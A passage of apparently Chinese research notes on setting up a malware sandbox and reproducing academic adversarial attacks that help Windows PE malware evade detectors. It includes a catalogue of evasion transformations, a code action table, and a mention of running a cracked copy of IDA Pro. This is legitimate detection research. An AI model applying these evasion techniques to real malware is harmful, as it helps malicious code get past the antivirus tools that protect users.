class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start mongod</span><br></pre></td></tr></table></figure><h3 id="7-设置MongoDB服务开机自启"><a href="#7-设置MongoDB服务开机自启" class="headerlink" title="7. 设置MongoDB服务开机自启"></a>7. 设置MongoDB服务开机自启</h3><p>为了确保MongoDB在系统启动时自动启动，你可以启用服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> mongod</span><br></pre></td></tr></table></figure><h3 id="8-检查MongoDB服务状态"><a href="#8-检查MongoDB服务状态" class="headerlink" title="8. 检查MongoDB服务状态"></a>8. 检查MongoDB服务状态</h3><p>你可以通过以下命令检查MongoDB服务的状态，以确保它运行正常：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl status mongod</span><br></pre></td></tr></table></figure><p>至此，你已经成功在Ubuntu 22.04上安装了MongoDB 4.2。</p></blockquote><p>⚠️ ubuntu22.04 的 tcpdump的路径已经从 &#x2F;sbin&#x2F; 变为 &#x2F;bin&#x2F;</p><p>⚠️ 2022-07-02 03:09:17,187 [cuckoo.core.guest] DEBUG: cuckoo2: not ready yet 问题</p><blockquote><p>2022-07-02 03:09:17,187 [cuckoo.core.guest] DEBUG: cuckoo2: not ready yet<br>这个问题基本都是因为cuckoo的客户机中重启的时候agent没有启动成功。或者是保存快照的时候没有成功设置好开机自动启动agent（我参照的两个链接中用了不同的方法，我采用的是官方的办法），或者就是没安装python导致启动失败（安装python2.7就解决了）。</p><p>原文链接：<a href="https://blog.csdn.net/qq_40976667/article/details/125574007">https://blog.csdn.net/qq_40976667/article/details/125574007</a></p></blockquote><p>⚠️ </p><blockquote><p>≈ 你遇到的问题是由于 <code>m2crypto</code> 依赖于 OpenSSL 库的头文件和 SWIG，而当前的环境缺少这些头文件或不兼容的版本。要在 Python 2.7 上安装 <code>m2crypto==0.24.0</code>，可以尝试以下步骤：</p><h3 id="1-安装兼容的-OpenSSL-版本"><a href="#1-安装兼容的-OpenSSL-版本" class="headerlink" title="1. 安装兼容的 OpenSSL 版本"></a>1. 安装兼容的 OpenSSL 版本</h3><h3 id="重新编译-OpenSSL-以生成动态库"><a href="#重新编译-OpenSSL-以生成动态库" class="headerlink" title="重新编译 OpenSSL 以生成动态库"></a>重新编译 OpenSSL 以生成动态库</h3><ol><li><p>进入 OpenSSL 的源代码目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制代码</span><br><span class="line">cd /path/to/openssl-1.0.2u/</span><br></pre></td></tr></table></figure></li><li><p>清理之前的构建：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制代码</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure></li><li><p>重新配置编译并生成动态库（<code>libssl.so</code> 和 <code>libcrypto.so</code>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制代码</span><br><span class="line">./config --prefix=/usr/local/ssl shared</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>这里的 <code>shared</code> 选项将确保 OpenSSL 构建包含动态库。</p></li><li><p>验证是否生成了动态库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制代码</span><br><span class="line">ls /usr/local/ssl/lib/libcrypto.so</span><br><span class="line">ls /usr/local/ssl/lib/libssl.so</span><br></pre></td></tr></table></figure></li></ol><h3 id="2-设置-OpenSSL-环境变量"><a href="#2-设置-OpenSSL-环境变量" class="headerlink" title="2. 设置 OpenSSL 环境变量"></a>2. 设置 OpenSSL 环境变量</h3><p>在编译和安装 <code>m2crypto</code> 时，需要确保使用正确的 OpenSSL 版本。你需要设置 <code>LDFLAGS</code> 和 <code>CPPFLAGS</code> 以指向你安装的 OpenSSL 路径。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LDFLAGS=<span class="string">&quot;-L/usr/local/ssl/lib&quot;</span></span><br><span class="line"><span class="built_in">export</span> CPPFLAGS=<span class="string">&quot;-I/usr/local/ssl/include&quot;</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;/usr/local/ssl/bin:<span class="variable">$PATH</span>&quot;</span></span><br></pre></td></tr></table></figure><h3 id="3-安装-SWIG-3-x"><a href="#3-安装-SWIG-3-x" class="headerlink" title="3. 安装 SWIG 3.x"></a>3. 安装 SWIG 3.x</h3><p>你可能需要安装较旧的 SWIG 版本（如 3.x 系列），以确保与 Python 2.7 的兼容性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove swig</span><br><span class="line">wget https://sourceforge.net/projects/swig/files/swig/swig-3.0.12/swig-3.0.12.tar.gz</span><br><span class="line">tar -xvf swig-3.0.12.tar.gz</span><br><span class="line"><span class="built_in">cd</span> swig-3.0.12</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h3 id="4-安装-m2crypto-0-24-0"><a href="#4-安装-m2crypto-0-24-0" class="headerlink" title="4. 安装 m2crypto==0.24.0"></a>4. 安装 <code>m2crypto==0.24.0</code></h3><ol><li><p>进入 <code>M2Crypto-0.24.0</code> 目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制代码</span><br><span class="line">cd ~/estimation_on_attacker/cuckoo_sandbox/M2Crypto-0.24.0/</span><br></pre></td></tr></table></figure></li><li><p>设置环境变量，确保链接到正确的 OpenSSL 路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制代码</span><br><span class="line">export LDFLAGS=&quot;-L/usr/local/ssl/lib&quot;</span><br><span class="line">export CPPFLAGS=&quot;-I/usr/local/ssl/include&quot;</span><br></pre></td></tr></table></figure></li><li><p>运行安装命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制代码</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="ClamAV"><a href="#ClamAV" class="headerlink" title="ClamAV"></a>ClamAV</h2><p>完成的部分：</p><ul><li><p>首先使用<code>sudo clamd</code>启动<code>clamd</code>进程</p></li><li><p>然后使用<code>sudo clamdscan</code>扫描</p></li><li><p>已经安装并了解ClamAV的使用方法 clamdcan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu-linux-22-04-02-desktop:~$ clamscan detector_repo/dateset_large_size/VirusShare_0b346b201da259377ba11438504bbd9e </span><br><span class="line">Loading:    14s, ETA:   0s [========================&gt;]    8.70M/8.70M sigs       </span><br><span class="line">Compiling:   5s, ETA:   0s [========================&gt;]       41/41 tasks </span><br><span class="line"></span><br><span class="line">/home/parallels/detector_repo/dateset_large_size/VirusShare_0b346b201da259377ba11438504bbd9e: Win.Trojan.Delf-2345 FOUND</span><br><span class="line"></span><br><span class="line">----------- SCAN SUMMARY -----------</span><br><span class="line">Known viruses: 8696388</span><br><span class="line">Engine version: 1.3.1</span><br><span class="line">Scanned directories: 0</span><br><span class="line">Scanned files: 1</span><br><span class="line">Infected files: 1</span><br><span class="line">Data scanned: 0.29 MB</span><br><span class="line">Data read: 0.19 MB (ratio 1.49:1)</span><br><span class="line">Time: 25.619 sec (0 m 25 s)</span><br><span class="line">Start Date: 2024:07:21 13:33:09</span><br><span class="line">End Date:   2024:07:21 13:33:34</span><br><span class="line">parallels@ubuntu-linux-22-04-02-des</span><br></pre></td></tr></table></figure></li><li><p>使用<code>sudo systemctl unmask clamav-daemon</code>解除对 <code>clamav-daemon.service</code> 的屏蔽状态</p></li><li><p><code>sudo systemctl start clamav-daemon</code>解除屏蔽之后，尝试启动 <code>clamav-daemon</code> 服务：</p></li><li><p><code>sudo systemctl status clamav-daemon</code>查看 <code>clamav-daemon</code> 是否已经启动成功</p></li></ul><p>计划：</p><ul><li>尝试将ClamAV集成到各个attacker的代码中</li></ul><h1 id="Attacker的实验复现记录"><a href="#Attacker的实验复现记录" class="headerlink" title="Attacker的实验复现记录"></a>Attacker的实验复现记录</h1><h2 id="malware-rl-实验复现"><a href="#malware-rl-实验复现" class="headerlink" title="malware_rl 实验复现"></a>malware_rl 实验复现</h2><p>我在代码中修改的部分：</p><ol><li>使用<code>get_vt_report.py</code>脚本获取样本的virustotals报告，然后使用<code>avclassfication</code>为其分类。</li><li>移除无法被lief正确加载的样本，通过<code>keep_valid_pefile.py</code>过滤</li><li>程序开始时，将文件夹中的文件用被攻击的检测器检测，删掉已经被标记为合法的文件</li><li>episode_count 初始值等于文件数量，即对每一个文件执行一个回合，每个回合的步数遵循源码，为50步，即MAXTURNS&#x3D;50。</li><li>成功逃逸的样本会从待选列表中删除</li><li>补充了对avast、clamav的攻击<ul><li>对clamav的实现方式为，调用虚拟机（本机）的clamd进程扫描样本</li><li>对avast的攻击实现方式为：使用ssh连接宿主机（远程机器），通过远程机器的avast scan扫描样本获取结果。（因为avast没有linux版本）</li></ul></li></ol><p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-07-23%2015.05.50.png" alt="截屏2024-07-23 15.05.50"></p><p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-07-23%2015.05.58.png" alt="截屏2024-07-23 15.05.58"></p><h3 id="针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正："><a href="#针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：" class="headerlink" title="针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正："></a><strong>针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：</strong></h3><ul><li><p>❗️源代码中显示攻击的<code>detection</code>为<code>ember</code>、<code>sorel</code>、<code>malconv。</code></p></li><li><p>❗️源代码中并没有实现对对抗性样本的<code>Format Preservation</code>、<code>Executability Preservation</code>、<code>Maliciousness Preservation</code>的验证。</p></li><li><p>❗️虽然是基于<code>gym</code>提供的强化学习的框架，但是实际的动作选择是随机的。</p><blockquote><p><em><code>RandomAgent</code> 仅仅是一个随机选择动作的简单代理，它在每次需要选择动作时，都从动作空间中随机采样。这个过程不涉及任何学习或策略优化，因此不属于强化学习的范畴。</em></p></blockquote></li><li><p><code>Transformation</code>的具体<code>action</code>如下</p><ol><li><code>modify_machine_type</code></li><li><code>pad_overlay</code></li><li><code>append_benign_data_overlay</code></li><li><code>append_benign_binary_overlay</code></li><li><code>add_bytes_to_section_cave</code></li><li><code>add_section_strings</code></li><li><code>add_section_benign_data</code></li><li><code>add_strings_to_overlay</code></li><li><code>add_imports</code></li><li><code>rename_section</code></li><li><code>remove_debug</code></li><li><code>modify_optional_header</code></li><li><code>modify_timestamp</code></li><li><code>break_optional_header_checksum</code></li><li><code>upx_unpack</code></li><li><code>upx_pack</code></li></ol></li></ul><h3 id="代码的整体逻辑"><a href="#代码的整体逻辑" class="headerlink" title="代码的整体逻辑"></a><strong>代码的整体逻辑</strong></h3><ul><li><code>random_agent.py:</code>是主函数，使用gym提供的强化学习方法实现攻击，总计250次训练回合</li><li><code>malware/env</code>中实现了强化学习中的各种环境</li><li><code>malware/env/utils</code>中检测器模型和文件接口</li><li><code>malware/env/controls/modifier.py</code>中是对二进制文件的修改操作</li></ul><p>完成的部分：</p><ul><li>阅读完源码</li><li>已经把源代码跑起来了</li><li>添加了对ClamAV的攻击</li></ul><h3 id="出现的问题："><a href="#出现的问题：" class="headerlink" title="出现的问题："></a><strong>出现的问题：</strong></h3><ul><li><p>❗️<strong>获取不了<code>sorel</code>模型</strong>：因为需要亚马逊账号，但注册亚马逊账号需要一张VISA卡。</p></li><li><p>❗️<strong>源码逃逸率的计算很奇怪，并不是 逃逸的样本数量 &#x2F; 总样本数量</strong></p></li><li><p>❗️<strong>源码接受的病毒样本大小最大为1MB</strong></p></li><li><p>❗️**<code>lief</code>库无法处理大小超过<code>1073741824 bytes</code>的section**：这个问题目前来说是无法解决的，因为要修改第三方库</p><blockquote><p><em>某些PE样本在被LIEF解析时返回错误，因为该库不使用任何反汇编器，导致在导入地址表上实现的LEA指令导入过程中出现损坏。为了解决这个问题，需要进行初步过滤，以隔离正确解析的功能性样本。并不是所有生成的变种都是有效的，因为扰动可能会使文件损坏。我们的实验表明，通常需要创建至少两倍于预期有效文件数量的变种。</em></p></blockquote></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Sample: d33e6b41a890d73d656e2bdd0663a9d28c75226796a069b861f63afe790d4ee2</span><br><span class="line">DEBUG clamav_gym FUNC step</span><br><span class="line">DEBUG clamav_gym FUNC _take_action</span><br><span class="line">DEBUG modifier FUNC modify_sample, action modify_machine_type</span><br><span class="line">DEBUG modifier FUNC modify_machine_type</span><br><span class="line">The padding size of section <span class="string">&#x27;.pdata&#x27;</span> is huge. Only the first 1073741824 bytes will be taken into account</span><br><span class="line">Can<span class="string">&#x27;t read the padding content of section &#x27;</span>.pdata<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Section #4 (��) is corrupted</span></span><br><span class="line"><span class="string">The padding size of section &#x27;</span>��<span class="string">&#x27; is huge. Only the first 1073741824 bytes will be taken into account</span></span><br><span class="line"><span class="string">Can&#x27;</span>t <span class="built_in">read</span> the padding content of section <span class="string">&#x27;��&#x27;</span></span><br><span class="line">     parse ok</span><br><span class="line"></span><br><span class="line">output <span class="keyword">done</span></span><br><span class="line">Killed</span><br></pre></td></tr></table></figure><h2 id="ARMED-实验复现"><a href="#ARMED-实验复现" class="headerlink" title="ARMED 实验复现"></a>ARMED 实验复现</h2><h3 id="我对代码的修改："><a href="#我对代码的修改：" class="headerlink" title="我对代码的修改："></a>我对代码的修改：</h3><ol><li>修改了原代码中不合理的部分，新增<code>armed_fix</code>环境作为测试代码</li><li>搭建了sanbox平台，对<code>IntegerityCheck</code>做出新的定义：report中<code>signatures</code>字段相同</li><li>增加了<code>avast</code>、<code>clamav</code>检测，统一了<code>ember</code>模型为<code>ember_2018.txt</code></li><li></li></ol><h3 id="ARMED的finding"><a href="#ARMED的finding" class="headerlink" title="ARMED的finding:"></a>ARMED的finding:</h3><p>评估显示，与原始样本S的检测相比，随机二进制级别的修改使得变种S’的恶意软件引擎检测率降低了最多80%。生成功能性变种在很大程度上取决于随机注入的扰动的具体顺序。我们的实验表明，平均约18%的变种是功能性的且未被破坏。</p><ol><li><p>测试样本生成的有效性验证：</p><ul><li>某些PE样本在通过LIEF解析时会返回错误，这是因为该库在导入LEA指令期间没有使用反汇编器，导致导入地址表损坏。</li><li>通常需要生成至少两倍于预期有效文件数量的变种 。</li></ul></li><li><p>检测率评估：使用VirusTotal平台评估了ARMED生成新的变种样本的检测率。❗️</p><ul><li><p>注入少量扰动就可以显著降低新变种的检测率：只注入五个扰动，也能使变种的检测率显著下降，反而更长的扰动不一定有效</p></li><li><p>在注入扰动后的几天内，大多数引擎开始检测到新变种，表明新的变种上传后，检测引擎会调整其检测策略 。</p><blockquote><p>❗️<em>argue</em></p><p><em>使用 VirusTotal 进行杀毒软件比较分析的人应当知道，他们在方法论上犯了许多隐含的错误，其中最明显的错误包括：</em></p><ol><li><em><strong>命令行版本的差异</strong>：VirusTotal 的杀毒引擎是命令行版本，因此根据产品的不同，它们的行为可能与桌面版本不完全相同。例如，桌面解决方案可能使用基于行为分析的技术，并配有个人防火墙，这些都会减少入口点并缓解传播等问题。</em></li><li><em><strong>桌面和外围解决方案的共存</strong>：在 VirusTotal 中，面向桌面的解决方案与面向外围的解决方案共存；后者的启发式算法可能更具攻击性和偏执，因为在外围环境中，误报的影响不太明显。因此，将这两类解决方案进行比较是不公平的。</em></li><li><em><strong>不同的启发式&#x2F;攻击性参数</strong>：VirusTotal 中的一些解决方案根据开发公司意愿被配置了与官方终端用户默认配置不同的启发式&#x2F;攻击性级别。</em></li></ol></blockquote></li></ul></li><li><p>序列结构评估：</p><ul><li><p>特定数量的扰动比其他数量更能有效降低检测率，表明扰动序列的顺序可能比序列长度更为重要 。</p></li><li><p>注入较少扰动的序列在某些情况下会导致较高的检测率，这可能是因为这些变种与原始样本非常相似，检测引擎能够更好地调整其检测 。❗️</p><blockquote><p><em>❗️argue，没有回答检测引擎是通过什么来判断它们的相似性并调整检测的？</em></p><p><em>哈希狩猎</em></p></blockquote></li></ul></li><li><p>处理时间评估：</p><ul><li>创建变种平均需要5分钟；使用第三方分类器对时间的影响较大。</li></ul></li><li><p>局限性：</p><ul><li><strong>序列长度与哈希冲突</strong>：当注入的扰动序列长度为1或2时，许多变种最终会与原始样本S重复，导致两者的加密哈希值相同。</li><li><strong>安全层的影响</strong>：尽管生成的变种S’检测率较低，但安全层（如防火墙配置）仍然可以帮助防止感染。例如，如果S’是由恶意软件下拉器或下载器生成的，这些下拉或投放的有效载荷可以被检测到，或者新的样本可能已经为恶意软件引擎所知。</li><li><strong>综合规避策略</strong>：ARMED框架可以应用于不同类型的恶意软件样本（如下拉器、下载器和有效载荷），并结合额外的规避层（如打包器）来提高逃避率。这表明，仅依靠单一方法可能不足以完全逃避检测，需要综合使用多种技术来提高成功率。</li></ul></li></ol><h3 id="针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：-1"><a href="#针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：-1" class="headerlink" title="针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正："></a>针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：</h3><p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-07-23%2015.38.00.png" alt="截屏2024-07-23 15.38.00"></p><p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-07-23%2015.38.27.png" alt="截屏2024-07-23 15.38.27"></p><ul><li><p><code>Transformation</code>的操作</p><blockquote><p><em>发现FAME仓库里对malware的manipulation与gym-malware（现在新仓库为malware_rl）相同，<code>FAME/data/manipulate.py</code></em></p><p>❗️**<code>imports_append</code>和<code>create_entry</code>未被使用，因为实验表明它们可能无法正确修补样本，并且很可能由于入口点错误而创建损坏的文件。**</p><p>❓但是源代码中有<code>imports_append</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># List of actions</span></span><br><span class="line">ACTION_TABLE = &#123;</span><br><span class="line">    <span class="string">&#x27;overlay_append&#x27;</span>: <span class="string">&#x27;overlay_append&#x27;</span>,     <span class="comment"># 0</span></span><br><span class="line">    <span class="string">&#x27;imports_append&#x27;</span>: <span class="string">&#x27;imports_append&#x27;</span>,     <span class="comment"># 1</span></span><br><span class="line">    <span class="string">&#x27;section_rename&#x27;</span>: <span class="string">&#x27;section_rename&#x27;</span>,     <span class="comment"># 2</span></span><br><span class="line">    <span class="string">&#x27;section_add&#x27;</span>: <span class="string">&#x27;section_add&#x27;</span>,           <span class="comment"># 3</span></span><br><span class="line">    <span class="string">&#x27;section_append&#x27;</span>: <span class="string">&#x27;section_append&#x27;</span>,     <span class="comment"># 4</span></span><br><span class="line">    <span class="string">&#x27;remove_signature&#x27;</span>: <span class="string">&#x27;remove_signature&#x27;</span>, <span class="comment"># 5</span></span><br><span class="line">    <span class="string">&#x27;remove_debug&#x27;</span>: <span class="string">&#x27;remove_debug&#x27;</span>,         <span class="comment"># 6</span></span><br><span class="line">    <span class="string">&#x27;upx_pack&#x27;</span>: <span class="string">&#x27;upx_pack&#x27;</span>,                 <span class="comment"># 7</span></span><br><span class="line">    <span class="string">&#x27;upx_unpack&#x27;</span>: <span class="string">&#x27;upx_unpack&#x27;</span>,             <span class="comment"># 8</span></span><br><span class="line">    <span class="string">&#x27;break_optional_header_checksum&#x27;</span>: <span class="string">&#x27;break_optional_header_checksum&#x27;</span>  <span class="comment"># 9</span></span><br><span class="line"><span class="comment">#   &#x27;create_new_entry&#x27;: &#x27;create_new_entry&#x27;, # generates often entry point errors</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><ol><li><code>overlay_append</code></li><li><code>imports_append</code></li><li><code>section_rename</code></li><li><code>section_add</code></li><li><code>section_append</code></li><li><code>remove_signature</code></li><li><code>remove_debug</code></li><li><code>upx_pack</code></li><li><code>upx_unpack</code></li><li><code>break_optional_header_checksum</code></li></ol></li><li><p>❗️<code>functionality</code>的检测方法不具备说服力</p><ol><li>函数<code>malware_analysis</code>：样本在沙盒中运行时间超过<code>15s</code>且报告中没有<code>err</code>，则为<code>functionality</code></li><li>函数<code>malware_analysis_HA</code>：样本报告中含有<code>domains</code>或<code>compromised_hosts</code>，则为<code>functionality</code></li></ol></li></ul><h2 id="AIMED-实验复现"><a href="#AIMED-实验复现" class="headerlink" title="AIMED 实验复现"></a>AIMED 实验复现</h2><h3 id="针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：-2"><a href="#针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：-2" class="headerlink" title="针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正："></a>针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：</h3><p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-07-23%2015.38.00-1813762.png" alt="截屏2024-07-23 15.38.00"></p><p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-07-24%2017.35.49.png" alt="截屏2024-07-24 17.35.49"></p><ul><li><p><code>AIMED</code>攻击的检测器：<code>GBDT (static)</code>、<code>Sophos</code>、<code>ESET</code>和<code>Kaspersky</code></p><blockquote><p>所有扫描器都使用默认配置的静态检测进行测试，版本如下：Kaspersky 19、ESET NOD32 Antivirus 11和Sophos Endpoint Security 10.8，并在实验进行时保持最新。</p></blockquote></li><li></li></ul><h2 id="Shallow-Security-on-the-Creation-of-Adversarial-Variants-to-Evade-Machine-Learning-Based-Malware-Detectors-实验复现"><a href="#Shallow-Security-on-the-Creation-of-Adversarial-Variants-to-Evade-Machine-Learning-Based-Malware-Detectors-实验复现" class="headerlink" title="Shallow Security: on the Creation of Adversarial Variants to Evade Machine Learning-Based Malware Detectors 实验复现"></a>Shallow Security: on the Creation of Adversarial Variants to Evade Machine Learning-Based Malware Detectors 实验复现</h2><p>❓这个源码太复杂，晚点来看</p><h3 id="Shallow-Security的findings-amp-contribution"><a href="#Shallow-Security的findings-amp-contribution" class="headerlink" title="Shallow Security的findings &amp; contribution"></a>Shallow Security的findings &amp; contribution</h3><ul><li><p>基于原始二进制数据的ML模型可以通过在二进制文件中追加数据来绕过。</p></li><li><p>基于频率的ML模型可以通过在恶意软件二进制文件中嵌入良性字符串来绕过。</p></li><li><p>了解PE格式的分类器可能更倾向于检测打包器，而不是实际学习恶意二进制文件的概念。</p><p>提出了三种方法来缓解我们发现的缺点：</p><ol><li>操作系统加载器在加载文件时应更关注二进制不一致性，以避免加载由二进制数据插入产生的格式错误的二进制文件。</li><li>ML模型应更关注恶意特征的存在，而不是其频率，以更能抵抗数据追加。</li><li>我们主张在评估未来提出的基于ML的恶意软件检测器时，应考虑恶意软件变体的鲁棒性。</li></ol></li></ul><p>贡献如下：</p><ol><li>我们描述了参与对基于ML的恶意软件检测器进行对抗性攻击挑战的经历。</li><li>我们描述了在实验中发现的模型弱点。</li><li>我们提出了未来基于ML的恶意软件检测研究的措施。</li></ol><ul><li><p>附加数据的脆弱性</p></li><li><p>对抗性恶意软件体积大</p></li><li><p>基于特征存在而非频率开发模型</p></li><li><p>域特定模型的偏见</p></li><li><p>采用恶意软件变体的稳健性作为评估标准：为了提升恶意软件检测的实际效果，应该在评估机器学习检测器时，加入对恶意软件变体的稳健性测试，即使是深度学习模型也可能被绕过，因此需要更全面的评估标准。</p></li><li><p>创建稳健表示：要开发不受良性软件特征影响的检测方法，以防止恶意软件通过添加良性特征来绕过检测，同时还应检查文件资源和嵌入的PE文件，以识别隐藏的恶意内容。</p></li><li><p>转换样本为下载器</p></li><li><p>生成对抗性样本</p></li></ul><h3 id="针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：-3"><a href="#针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：-3" class="headerlink" title="针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正："></a>针对adversarial-attacks-and-defenses-for-windows-pe-malware-detection中总结的补充和纠正：</h3><p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-07-23%2015.38.00-3083355.png" alt="截屏2024-07-23 15.38.00"></p><p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-08-08%2010.17.22.png" alt="截屏2024-08-08 10.17.22"></p><h2 id="Malware-Makeover-Breaking-ML-based-Static-Analysis-by-Modifying-Executable-Bytes-实验复现"><a href="#Malware-Makeover-Breaking-ML-based-Static-Analysis-by-Modifying-Executable-Bytes-实验复现" class="headerlink" title="Malware Makeover: Breaking ML-based Static Analysis by Modifying Executable Bytes 实验复现"></a>Malware Makeover: Breaking ML-based Static Analysis by Modifying Executable Bytes 实验复现</h2><h3 id="记录一下复现过程"><a href="#记录一下复现过程" class="headerlink" title="记录一下复现过程"></a>记录一下复现过程</h3><p>环境：ubuntu22.04 conda 32位python ida pro 6.4破解版</p><p>这个是可以运行的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /home/parallels/estimation_on_attacker/IDA_Pro_v6.4_and_Hex-Rays_Decompiler/IDA_Pro_v6.4_and_Hex-Rays_Decompiler/idal -A -S/home/parallels/estimation_on_attacker/attackers/binary-transform/enhanced-binary-randomization/orp/inp_ida.py example/caffeine.exe</span><br></pre></td></tr></table></figure><h3 id="就地随机化（In-Place-Randomization，IPR）的转换类型-71-。"><a href="#就地随机化（In-Place-Randomization，IPR）的转换类型-71-。" class="headerlink" title="就地随机化（In-Place Randomization，IPR）的转换类型 [71]。"></a>就地随机化（In-Place Randomization，IPR）的转换类型 [71]。</h3><p>对于一个需要随机化的二进制文件，Pappas 等人提出了对其进行反汇编，识别函数和基本块，静态执行四种保持功能性的转换类型，然后根据修改后的汇编代码更新二进制文件。这四种转换类型分别是：</p><ol><li>使用等长的等效指令替换现有指令（例如，<code>sub eax,4 → add eax,-4</code>）。</li><li>在函数或基本块集合内重新分配寄存器（例如，交换所有 <code>ebx</code> 和 <code>ecx</code> 